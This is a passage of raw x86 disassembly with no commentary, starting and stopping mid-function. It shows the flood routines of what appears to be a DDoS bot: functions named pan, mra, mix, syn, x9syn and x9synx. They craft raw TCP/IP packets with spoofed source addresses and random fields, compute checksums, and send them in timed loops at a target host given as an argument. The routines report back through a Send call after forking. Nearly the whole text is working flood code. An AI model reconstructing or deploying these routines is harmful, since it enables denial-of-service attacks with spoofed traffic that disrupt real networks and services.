call   8048bd8 <rand@plt>
mov    WORD PTR [ebp-0x60],ax
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [ebp-0x58],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [ebp-0x54],eax
mov    WORD PTR [ebp-0x5a],0x0
mov    eax,DWORD PTR [ebp-0x20]
mov    WORD PTR [ebp-0x50],ax
mov    eax,DWORD PTR [ebp-0x1c]
mov    WORD PTR [ebp-0x4e],ax
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x4c],eax
mov    WORD PTR [ebp-0x40],0x0
mov    WORD PTR [ebp-0xa8],0x2
mov    eax,DWORD PTR [ebp-0x1c]
mov    WORD PTR [ebp-0xa6],ax
mov    eax,DWORD PTR [ebp-0x54]
mov    DWORD PTR [ebp-0xa4],eax
lea    eax,[ebp-0x64]
mov    DWORD PTR [esp+0x4],0x14
mov    DWORD PTR [esp],eax
call   804956e <in_cksum>
mov    WORD PTR [ebp-0x5a],ax
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0xfc],eax
lea    eax,[ebp-0xfc]
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x33],al
lea    eax,[ebp-0xfc]
add    eax,0x1
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x32],al
lea    eax,[ebp-0xfc]
add    eax,0x2
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x31],al
lea    eax,[ebp-0xfc]
add    eax,0x3
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x30],al
mov    eax,DWORD PTR [ebp-0x58]
mov    DWORD PTR [ebp-0x98],eax
mov    eax,DWORD PTR [ebp-0x54]
mov    DWORD PTR [ebp-0x94],eax
mov    BYTE PTR [ebp-0x90],0x0
mov    BYTE PTR [ebp-0x8f],0x6
mov    eax,DWORD PTR [ebp-0x24]
add    eax,0x14
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
mov    WORD PTR [ebp-0x8e],ax
lea    eax,[ebp-0x98]
lea    edx,[eax+0xc]
lea    eax,[ebp-0x64]
add    eax,0x14
mov    DWORD PTR [esp+0x8],0x14
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],eax
call   8048a98 <bcopy@plt>
mov    eax,DWORD PTR [ebp-0x24]
mov    DWORD PTR [esp+0x8],eax
lea    eax,[ebp-0x98]
add    eax,0x20
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x64]
add    eax,0x28
mov    DWORD PTR [esp],eax
call   8048a98 <bcopy@plt>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,0x20
lea    edx,[ebp-0x98]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   804956e <in_cksum>
mov    WORD PTR [ebp-0x40],ax
lea    eax,[ebp-0xa8]
mov    edx,DWORD PTR [ebp-0x24]
add    edx,0x28
mov    DWORD PTR [esp+0x14],0x10
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],edx
lea    eax,[ebp-0x64]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp],eax
call   80489c8 <sendto@plt>
cmp    DWORD PTR [ebp-0x28],0x31
jbe    804a563 <pan+0x3e3>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x8]
add    eax,DWORD PTR [ebp-0x10]
cmp    edx,eax
jb     804a55c <pan+0x3dc>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    DWORD PTR [ebp-0x28],0x0
add    DWORD PTR [ebp-0x28],0x1
jmp    804a374 <pan+0x1f4>
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x48
mov    DWORD PTR [ebp-0x1c],0x1
mov    DWORD PTR [esp],0x80
call   8048b78 <malloc@plt>
mov    DWORD PTR [ebp-0xc],eax
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    DWORD PTR [ebp-0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048eaa <mfork>
test   eax,eax
jne    804a71c <mra+0x1ae>
cmp    DWORD PTR [ebp+0x10],0x1
jg     804a5d8 <mra+0x6a>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cbf0
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b18 <atol@plt>
mov    DWORD PTR [ebp-0x10],eax
mov    DWORD PTR [esp+0x8],0x10
mov    DWORD PTR [esp+0x4],0x0
lea    eax,[ebp-0x2c]
mov    DWORD PTR [esp],eax
call   8048a08 <memset@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8049e43 <host2ip>
mov    DWORD PTR [ebp-0x28],eax
mov    WORD PTR [ebp-0x2c],0x2
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cc10
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
call   8048bd8 <rand@plt>
mov    WORD PTR [ebp-0x2a],ax
mov    DWORD PTR [esp+0x8],0x11
mov    DWORD PTR [esp+0x4],0x2
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    DWORD PTR [ebp-0x18],eax
cmp    DWORD PTR [ebp-0x18],0x0
js     804a6d7 <mra+0x169>
mov    DWORD PTR [ebp-0x1c],0x1
lea    eax,[ebp-0x1c]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x5421
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048a68 <ioctl@plt>
lea    eax,[ebp-0x2c]
mov    DWORD PTR [esp+0x14],0x10
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x80
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   80489c8 <sendto@plt>
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
cmp    DWORD PTR [ebp-0x14],0x31
jle    804a6fc <mra+0x18e>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x4]
add    eax,DWORD PTR [ebp-0x10]
cmp    edx,eax
jae    804a705 <mra+0x197>
mov    DWORD PTR [ebp-0x14],0x0
add    DWORD PTR [ebp-0x14],0x1
jmp    804a64c <mra+0xde>
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x118
lea    ecx,[ebp-0xfc]
mov    edx,0x804cc40
mov    eax,0x50
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],ecx
call   8048aa8 <memcpy@plt>
mov    DWORD PTR [ebp-0x2c],0x0
mov    DWORD PTR [ebp-0x28],0x14
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    DWORD PTR [ebp-0x8],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048eaa <mfork>
test   eax,eax
jne    804aadb <mix+0x3bd>
cmp    DWORD PTR [ebp+0x10],0x2
jg     804a7a3 <mix+0x85>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cc90
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    DWORD PTR [esp+0x8],0xff
mov    DWORD PTR [esp+0x4],0x3
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0x0
jns    804a7d4 <mix+0xb6>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    DWORD PTR [ebp-0x4],0x0
jmp    804a7f2 <mix+0xd4>
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [ebp+eax*4-0xfc]
mov    BYTE PTR [ebp+edx*1-0x40],al
add    DWORD PTR [ebp-0x4],0x1
cmp    DWORD PTR [ebp-0x4],0x13
jle    804a7dd <mix+0xbf>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8049e43 <host2ip>
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0xc
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b18 <atol@plt>
mov    DWORD PTR [ebp-0x10],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b28 <atoi@plt>
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
movzx  eax,ax
mov    DWORD PTR [ebp-0x20],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804ccb8
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
movzx  eax,BYTE PTR [ebp-0x68]
and    eax,0xfffffff0
or     eax,0x5
mov    BYTE PTR [ebp-0x68],al
movzx  eax,BYTE PTR [ebp-0x68]
and    eax,0xf
or     eax,0x40
mov    BYTE PTR [ebp-0x68],al
mov    BYTE PTR [ebp-0x67],0x10
mov    WORD PTR [ebp-0x62],0x40
mov    BYTE PTR [ebp-0x60],0xff
mov    BYTE PTR [ebp-0x5f],0x6
movzx  eax,BYTE PTR [ebp-0x48]
and    eax,0xf
or     eax,0x50
mov    BYTE PTR [ebp-0x48],al
movzx  eax,BYTE PTR [ebp-0x48]
and    eax,0xfffffff0
mov    BYTE PTR [ebp-0x48],al
movzx  eax,BYTE PTR [ebp-0x47]
and    eax,0x7f
mov    BYTE PTR [ebp-0x47],al
movzx  eax,BYTE PTR [ebp-0x47]
and    eax,0xffffffbf
mov    BYTE PTR [ebp-0x47],al
movzx  eax,BYTE PTR [ebp-0x47]
and    eax,0xffffffdf
mov    BYTE PTR [ebp-0x47],al
movzx  eax,BYTE PTR [ebp-0x47]
or     eax,0x10
mov    BYTE PTR [ebp-0x47],al
movzx  eax,BYTE PTR [ebp-0x47]
and    eax,0xfffffff7
mov    BYTE PTR [ebp-0x47],al
movzx  eax,BYTE PTR [ebp-0x47]
and    eax,0xfffffffb
mov    BYTE PTR [ebp-0x47],al
movzx  eax,BYTE PTR [ebp-0x47]
and    eax,0xfffffffe
mov    BYTE PTR [ebp-0x47],al
movzx  eax,BYTE PTR [ebp-0x47]
or     eax,0x2
mov    BYTE PTR [ebp-0x47],al
mov    WORD PTR [ebp-0x46],0x787d
mov    WORD PTR [ebp-0x42],0x0
call   8048f8e <getspoof>
mov    DWORD PTR [ebp-0x18],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b28 <atoi@plt>
test   eax,eax
jne    804a92f <mix+0x211>
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x20],eax
mov    eax,DWORD PTR [ebp-0x28]
add    eax,0x28
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
mov    WORD PTR [ebp-0x66],ax
call   8048bd8 <rand@plt>
mov    WORD PTR [ebp-0x64],ax
mov    WORD PTR [ebp-0x5e],0x0
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [ebp-0x5c],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [ebp-0x58],eax
call   8048bd8 <rand@plt>
mov    WORD PTR [ebp-0x54],ax
mov    eax,DWORD PTR [ebp-0x20]
mov    WORD PTR [ebp-0x52],ax
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x50],eax
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x4c],eax
mov    WORD PTR [ebp-0x44],0x0
mov    WORD PTR [ebp-0xac],0x2
movzx  eax,WORD PTR [ebp-0x52]
mov    WORD PTR [ebp-0xaa],ax
mov    eax,DWORD PTR [ebp-0x58]
mov    DWORD PTR [ebp-0xa8],eax
lea    eax,[ebp-0x68]
mov    DWORD PTR [esp+0x4],0x14
mov    DWORD PTR [esp],eax
call   804956e <in_cksum>
mov    WORD PTR [ebp-0x5e],ax
lea    eax,[ebp-0x68]
mov    DWORD PTR [esp+0x4],0x28
mov    DWORD PTR [esp],eax
call   804956e <in_cksum>
movzx  eax,ax
mov    DWORD PTR [ebp-0x1c],eax
mov    eax,DWORD PTR [ebp-0x5c]
mov    DWORD PTR [ebp-0x9c],eax
mov    eax,DWORD PTR [ebp-0x58]
mov    DWORD PTR [ebp-0x98],eax
mov    BYTE PTR [ebp-0x94],0x0
mov    BYTE PTR [ebp-0x93],0x6
mov    eax,DWORD PTR [ebp-0x28]
add    eax,0x14
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
mov    WORD PTR [ebp-0x92],ax
lea    eax,[ebp-0x9c]
lea    edx,[eax+0xc]
lea    eax,[ebp-0x68]
add    eax,0x14
mov    DWORD PTR [esp+0x8],0x14
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],eax
call   8048a98 <bcopy@plt>
mov    eax,DWORD PTR [ebp-0x28]
mov    DWORD PTR [esp+0x8],eax
lea    eax,[ebp-0x9c]
add    eax,0x20
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x68]
add    eax,0x28
mov    DWORD PTR [esp],eax
call   8048a98 <bcopy@plt>
mov    eax,DWORD PTR [ebp-0x28]
add    eax,0x20
lea    edx,[ebp-0x9c]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   804956e <in_cksum>
mov    WORD PTR [ebp-0x44],ax
lea    eax,[ebp-0xac]
mov    edx,DWORD PTR [ebp-0x28]
add    edx,0x28
mov    DWORD PTR [esp+0x14],0x10
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],edx
lea    eax,[ebp-0x68]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp],eax
call   80489c8 <sendto@plt>
cmp    DWORD PTR [ebp-0x2c],0x31
jbe    804aad2 <mix+0x3b4>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x8]
add    eax,DWORD PTR [ebp-0x10]
cmp    edx,eax
jb     804aacb <mix+0x3ad>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    DWORD PTR [ebp-0x2c],0x0
add    DWORD PTR [ebp-0x2c],0x1
jmp    804a90b <mix+0x1ed>
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x118
lea    ecx,[ebp-0xf8]
mov    edx,0x804cce0
mov    eax,0x50
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],ecx
call   8048aa8 <memcpy@plt>
mov    DWORD PTR [ebp-0x28],0x0
mov    DWORD PTR [ebp-0x24],0x14
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    DWORD PTR [ebp-0x8],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048eaa <mfork>
test   eax,eax
jne    804aec9 <syn+0x3ec>
cmp    DWORD PTR [ebp+0x10],0x2
jg     804ab62 <syn+0x85>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cd30
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    DWORD PTR [esp+0x8],0xff
mov    DWORD PTR [esp+0x4],0x3
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0x0
jns    804ab93 <syn+0xb6>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    DWORD PTR [ebp-0x4],0x0
jmp    804abb1 <syn+0xd4>
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [ebp+eax*4-0xf8]
mov    BYTE PTR [ebp+edx*1-0x3c],al
add    DWORD PTR [ebp-0x4],0x1
cmp    DWORD PTR [ebp-0x4],0x13
jle    804ab9c <syn+0xbf>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8049e43 <host2ip>
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0xc
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b18 <atol@plt>
mov    DWORD PTR [ebp-0x10],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cd58
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
movzx  eax,BYTE PTR [ebp-0x64]
and    eax,0xfffffff0
or     eax,0x5
mov    BYTE PTR [ebp-0x64],al
movzx  eax,BYTE PTR [ebp-0x64]
and    eax,0xf
or     eax,0x40
mov    BYTE PTR [ebp-0x64],al
mov    BYTE PTR [ebp-0x63],0x10
mov    WORD PTR [ebp-0x5e],0x40
mov    BYTE PTR [ebp-0x5c],0x40
mov    BYTE PTR [ebp-0x5b],0x6
mov    DWORD PTR [ebp-0x48],0x0
movzx  eax,BYTE PTR [ebp-0x44]
and    eax,0xf
or     eax,0xffffffa0
mov    BYTE PTR [ebp-0x44],al
movzx  eax,BYTE PTR [ebp-0x44]
and    eax,0xfffffff0
mov    BYTE PTR [ebp-0x44],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0x7f
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xffffffbf
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xffffffdf
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xffffffef
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xfffffff7
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xfffffffb
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
and    eax,0xfffffffe
mov    BYTE PTR [ebp-0x43],al
movzx  eax,BYTE PTR [ebp-0x43]
or     eax,0x2
mov    BYTE PTR [ebp-0x43],al
mov    WORD PTR [ebp-0x42],0x787d
mov    WORD PTR [ebp-0x3e],0x0
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b28 <atoi@plt>
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
movzx  eax,ax
mov    DWORD PTR [ebp-0x1c],eax
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x20],eax
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b28 <atoi@plt>
test   eax,eax
jne    804acf5 <syn+0x218>
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x1c],eax
call   8048f8e <getspoof>
mov    DWORD PTR [ebp-0x18],eax
mov    eax,DWORD PTR [ebp-0x24]
add    eax,0x28
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
mov    WORD PTR [ebp-0x62],ax
call   8048bd8 <rand@plt>
mov    WORD PTR [ebp-0x60],ax
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [ebp-0x58],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [ebp-0x54],eax
mov    WORD PTR [ebp-0x5a],0x0
mov    eax,DWORD PTR [ebp-0x20]
mov    WORD PTR [ebp-0x50],ax
mov    eax,DWORD PTR [ebp-0x1c]
mov    WORD PTR [ebp-0x4e],ax
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x4c],eax
mov    WORD PTR [ebp-0x40],0x0
mov    WORD PTR [ebp-0xa8],0x2
mov    eax,DWORD PTR [ebp-0x1c]
mov    WORD PTR [ebp-0xa6],ax
mov    eax,DWORD PTR [ebp-0x54]
mov    DWORD PTR [ebp-0xa4],eax
lea    eax,[ebp-0x64]
mov    DWORD PTR [esp+0x4],0x14
mov    DWORD PTR [esp],eax
call   804956e <in_cksum>
mov    WORD PTR [ebp-0x5a],ax
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0xfc],eax
lea    eax,[ebp-0xfc]
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x33],al
lea    eax,[ebp-0xfc]
add    eax,0x1
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x32],al
lea    eax,[ebp-0xfc]
add    eax,0x2
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x31],al
lea    eax,[ebp-0xfc]
add    eax,0x3
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x30],al
mov    eax,DWORD PTR [ebp-0x58]
mov    DWORD PTR [ebp-0x98],eax
mov    eax,DWORD PTR [ebp-0x54]
mov    DWORD PTR [ebp-0x94],eax
mov    BYTE PTR [ebp-0x90],0x0
mov    BYTE PTR [ebp-0x8f],0x6
mov    eax,DWORD PTR [ebp-0x24]
add    eax,0x14
movzx  eax,ax
mov    DWORD PTR [esp],eax
call   8048a38 <htons@plt>
mov    WORD PTR [ebp-0x8e],ax
lea    eax,[ebp-0x98]
lea    edx,[eax+0xc]
lea    eax,[ebp-0x64]
add    eax,0x14
mov    DWORD PTR [esp+0x8],0x14
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],eax
call   8048a98 <bcopy@plt>
mov    eax,DWORD PTR [ebp-0x24]
mov    DWORD PTR [esp+0x8],eax
lea    eax,[ebp-0x98]
add    eax,0x20
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x64]
add    eax,0x28
mov    DWORD PTR [esp],eax
call   8048a98 <bcopy@plt>
mov    eax,DWORD PTR [ebp-0x24]
add    eax,0x20
lea    edx,[ebp-0x98]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   804956e <in_cksum>
mov    WORD PTR [ebp-0x40],ax
lea    eax,[ebp-0xa8]
mov    edx,DWORD PTR [ebp-0x24]
add    edx,0x28
mov    DWORD PTR [esp+0x14],0x10
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],edx
lea    eax,[ebp-0x64]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp],eax
call   80489c8 <sendto@plt>
cmp    DWORD PTR [ebp-0x28],0x31
jbe    804aec0 <syn+0x3e3>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x8]
add    eax,DWORD PTR [ebp-0x10]
cmp    edx,eax
jb     804aeb9 <syn+0x3dc>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    DWORD PTR [ebp-0x28],0x0
add    DWORD PTR [ebp-0x28],0x1
jmp    804acd1 <syn+0x1f4>
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x48
mov    DWORD PTR [ebp-0x1c],0x1
mov    DWORD PTR [esp],0x2400
call   8048b78 <malloc@plt>
mov    DWORD PTR [ebp-0xc],eax
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    DWORD PTR [ebp-0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048eaa <mfork>
test   eax,eax
jne    804b079 <x9syn+0x1ae>
cmp    DWORD PTR [ebp+0x10],0x1
jg     804af35 <x9syn+0x6a>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cd7c
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x1
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x8
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp],eax
call   8048b18 <atol@plt>
mov    DWORD PTR [ebp-0x10],eax
mov    DWORD PTR [esp+0x8],0x10
mov    DWORD PTR [esp+0x4],0x0
lea    eax,[ebp-0x2c]
mov    DWORD PTR [esp],eax
call   8048a08 <memset@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8049e43 <host2ip>
mov    DWORD PTR [ebp-0x28],eax
mov    WORD PTR [ebp-0x2c],0x2
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0xc],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804cda0
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
call   8048bd8 <rand@plt>
mov    WORD PTR [ebp-0x2a],ax
mov    DWORD PTR [esp+0x8],0x11
mov    DWORD PTR [esp+0x4],0x2
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    DWORD PTR [ebp-0x18],eax
cmp    DWORD PTR [ebp-0x18],0x0
js     804b034 <x9syn+0x169>
mov    DWORD PTR [ebp-0x1c],0x1
lea    eax,[ebp-0x1c]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x5421
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048a68 <ioctl@plt>
lea    eax,[ebp-0x2c]
mov    DWORD PTR [esp+0x14],0x10
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x2400
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   80489c8 <sendto@plt>
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
cmp    DWORD PTR [ebp-0x14],0x31
jle    804b059 <x9syn+0x18e>
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x4]
add    eax,DWORD PTR [ebp-0x10]
cmp    edx,eax
jae    804b062 <x9syn+0x197>
mov    DWORD PTR [ebp-0x14],0x0
add    DWORD PTR [ebp-0x14],0x1
jmp    804afa9 <x9syn+0xde>
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x48
mov    DWORD PTR [ebp-0x1c],0x1
mov    DWORD PTR [esp],0x186a0
call   8048b78 <malloc@plt>
mov    DWORD PTR [ebp-0xc],eax
mov    DWORD PTR [esp],0x0
call   8048b68 <time@plt>
mov    DWORD PTR [ebp-0x4],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048eaa <mfork>
test   eax,eax
jne    804b229 <x9synx+0x1ae>
cmp    DWORD PTR [ebp+0x10],0x1
